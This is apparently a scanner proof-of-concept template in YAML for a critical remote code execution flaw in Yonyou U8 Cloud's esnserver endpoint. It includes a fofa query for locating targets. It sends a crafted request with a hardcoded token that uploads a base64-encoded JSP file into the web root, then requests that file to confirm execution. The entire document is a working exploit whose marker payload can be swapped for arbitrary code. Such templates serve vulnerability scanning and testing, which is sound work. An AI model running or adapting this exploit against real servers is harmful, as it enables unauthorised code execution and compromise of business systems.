id: poc-yaml-yongyou-u8-cloud-esnserver-arbitrary-reflection
info:
  name: 用友U8cloud系统esnserver接口 任意反射执行漏洞
  severity: critical
  tags:
  - rce
  finger: 用友-NC-Cloud
  fofa: app="用友-U8-Cloud"
variables:
  filename: to_lower(random_str(10))
requests:
- method: POST
  path: /service/esnserver
  headers:
    Content-Type: application/x-www-form-urlencoded
    Token: 469ce01522f64366750d1995ca119841
  data: '{"invocationInfo":{"ucode":"123","dataSource":"U8cloud","lang":"en"},"method":"uploadFile","className":"nc.itf.hr.tools.IFileTrans","param":{"p1":"UEsDBBQAAAAAAPR5NFm2C9sJVgAAAFYAAAAKAAAAY29tcHJlc3NlZDwlbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPjEyMzEyUEsBAhQAFAAAAAAA9Hk0WbYL2wlWAAAAVgAAAAoAAAAAAAAAAAAAALaBAAAAAGNvbXByZXNzZWRQSwUGAAAAAAEAAQA4AAAAfgAAAAAA","p2":"webapps/u8c_web/{{.filename}}.jsp"},"paramType":["p1:[B","p2:java.lang.String"]}'
  expression: "status_code == 200 && \ncontains(find_json(body,\"data\"), \"true\"\
    )\n"
- method: GET
  path: /{{.filename}}.jsp
  expression: "status_code == 200 && \nbody == \"12312\"\n"
transport: http
